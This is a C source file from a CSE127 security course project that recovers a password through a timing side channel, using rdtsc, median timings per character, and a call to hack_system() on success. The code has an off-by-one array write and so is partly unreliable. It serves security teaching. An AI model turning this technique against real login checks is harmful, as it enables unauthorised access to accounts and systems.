/*******************************************************
 CSE127 Project
 User routines file

  You can change anything in this file, just make sure 
  that when you have found the password, you call 
  hack_system() function on it.

 CSE127 Password guesser using timing

 *******************************************************/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

// include our "system" header
#include "sysapp.h"

#define ASCII_MIN 33
#define ASCII_MAX 126

#define NUM_COMPS 100

// Read cycle counter
#define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })

int comparator(const void* p1, const void* p2) {
    long l1 = *(long*) p1;
    long l2 = *(long*) p2;
    if (l1 < l2) 
        return -1;
    else if (l1 == l2)
        return 0;
    else
        return 1;
} 

int main(int argc, char **argv) {
    unsigned char guess[33];
    int numFound = 0; 
    
    unsigned long timesChosen[34];
    timesChosen[0] = 0;
 
    // set guess to zeros
    bzero(guess, sizeof(guess));
    unsigned long maxTime;

    while(1) {
         
        unsigned long singleCharTime[NUM_COMPS];
        unsigned long allCharTime[ASCII_MAX - ASCII_MIN + 1];
        unsigned char currChar; 
        maxTime = 0;       
        char maxChar = '\n';
        
 
        for (currChar = ASCII_MIN; currChar <= ASCII_MAX + 1; currChar++) { 
            if (currChar == ASCII_MAX + 1) 
                guess[numFound] = '\0';
            else 
                guess[numFound] = currChar;
            if (numFound != 32)
                guess[numFound + 1] = '\0';    
            // Get a bunch of time values
            int i;
            for (i = 0; i < NUM_COMPS; i++) { 
                // Start timer
                unsigned long start = rdtsc(); 
                
                if (check_pass(guess)) {
                    printf("Password Found!\n");
                    hack_system(guess);
                };
                
                unsigned long end = rdtsc();
                singleCharTime[i] = end - start;   
            } // End of timing for this char 
       
            // Find the median time for currChar
            qsort((void*)singleCharTime, NUM_COMPS, sizeof(unsigned long),
comparator);

            allCharTime[currChar - ASCII_MIN] = singleCharTime[NUM_COMPS/2];
 
        } // End of char loop 
        
         
        // All the chars for the current possition have been tested -- find max
        // time
        int i;
        for (i = 0; i < ASCII_MAX - ASCII_MIN + 1; i++) {
            if (allCharTime[i] > maxTime) {
                maxTime = allCharTime[i];
                if (i == (ASCII_MAX - ASCII_MIN + 1))
                    maxChar = '\0';
                else {
                    maxChar = (i + ASCII_MIN);
                }
            }

        }
        // At this point maxChar contains the current guess for this position
        guess[numFound++] = maxChar;
        
        timesChosen[numFound] = maxTime;
 
        if (numFound > 12)
            numFound = 0;
 
    } // End of infinite loop
    printf("Could not get the password!  Last guess was %s\n", guess);
    return 1;
};
